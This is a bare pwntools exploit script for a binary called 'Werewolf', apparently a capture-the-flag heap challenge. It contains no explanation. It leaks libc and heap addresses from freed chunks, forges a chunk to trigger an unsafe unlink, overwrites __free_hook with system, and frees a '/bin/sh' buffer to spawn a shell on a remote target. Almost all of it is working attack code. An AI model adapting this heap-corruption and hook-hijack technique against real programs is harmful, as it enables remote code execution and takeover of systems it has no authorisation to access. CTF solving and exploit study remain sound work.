#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 0

# modify this
elf = ELF('./Werewolf')

if DEBUG:
    io = process('./Werewolf')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add(size, action):
    ru("5.Exit")
    sl('1')
    ru('size:')
    sl(str(size))
    ru('action:')
    sn(action)

def edit(idx, action):
    ru("5.Exit")
    sl('3')
    ru('id')
    sl(str(idx))
    ru('action')
    sn(action)

def kill(idx):
    ru("5.Exit")
    sl('4')
    ru('id')
    sl(str(idx))

def show(idx):
    ru("5.Exit")
    sl('2')
    ru('id')
    sl(str(idx))

# define exploit function here
def pwn():
    add(0x60, '0' * 0x60)
    add(0x100, '1' * 0x100)
    add(0x100, '2' * 0x100)
    add(0x100, '3' * 0x100)
    add(0x100, '/bin/sh\x00\n')
    kill(1)
    kill(3)

    show(1)
    ru('action : ')
    libc_addr = u64(ru('\n')[:-1].ljust(8, '\x00'))
    info('libc_addr : ' + hex(libc_addr))

    system_addr = libc_addr + 0x7feda1ff93d0 - 0x7feda2379c58 
    free_hook = system_addr - 279504 + 3959208
    info('system : ' + hex(system_addr))
    info('free_hook : ' + hex(free_hook))

    show(3)
    ru('action : ')
    heap_addr = u64(ru('\n')[:-1].ljust(8, '\x00'))
    info('heap_addr : ' + hex(heap_addr))

    kill(2)
    fd = heap_addr - 0x108
    bk = heap_addr - 0x100

    payload = p64(0) + p64(1) + p64(fd) + p64(bk)
    payload += 'a' * (0x100 - 0x20)
    payload += p64(0x100) + p64(0x110)
    payload += 'b' * 0x100
    payload += p64(0)
    payload += p64(0x119)
    payload += 'c' * (0x100 - 0x20)

    #malloc another bigger chunk that will cover the chunks before
    add(0x300, payload) #5
    kill(2) #trigger unlink
    
    edit(1, p64(0xa1) + p64(free_hook) + p64(0x60) + '\n')
    edit(0, p64(system_addr) + '\n')
    pause()
    kill(4)
    io.interactive()
    return

if __name__ == '__main__':
    
    pause()
    pwn()
    
